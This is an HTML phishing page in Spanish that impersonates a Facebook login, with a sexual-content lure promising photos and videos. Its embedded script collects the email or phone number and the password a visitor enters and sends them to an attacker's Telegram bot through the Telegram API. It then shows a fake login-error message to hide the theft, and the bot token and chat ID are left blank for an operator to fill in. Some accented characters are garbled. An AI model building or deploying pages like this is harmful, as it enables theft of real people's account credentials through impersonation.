<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Iniciar con facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 350px;
        }
        .logo {
            font-size: 40px;
            font-weight: bold;
            color: #1877f2;
        }
        input {
            width: 95%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .btn-login {
            width: 100%;
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }
        .forgot {
            display: block;
            margin: 10px 0;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .btn-create {
            background-color: #42b72a;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">Эnlyfans facebook</div>
        <p>ヰregistrate y mira mis fotos y videos ヰ</p>
        <input type="text" id="username" placeholder="Correo electr贸nico o n煤mero de tel茅fono">
        <input type="password" id="password" placeholder="Contrase帽a">
        <button class="btn-login" onclick="sendToTelegram()">Iniciar sesi贸n</button>
        <a href="#" class="forgot">驴Olvidaste tu cuenta?</a>
        <hr>
        <button class="btn-create">Crear cuenta nueva</button>
    </div>

    <script>
        function sendToTelegram() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            
            if (username === "" || password === "") {
                alert("Por favor, completa todos los campos.");
                return;
            }

            const botToken = "";  // Reemplaza con tu token de bot
            const chatId = "";  // Reemplaza con tu chat ID o el ID del grupo

            const message = ` Nuevo inicio de sesi贸n:\n Usuario: ${username}\n Contrase帽a: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("Error al iniciar sesi贸n, int茅ntalo de nuevo.");
                    } else {
                        alert("Error en la conexi贸n.");
                    }
                })
                .catch(error => console.error("Error:", error));
        }
    </script>

</body>
</html>
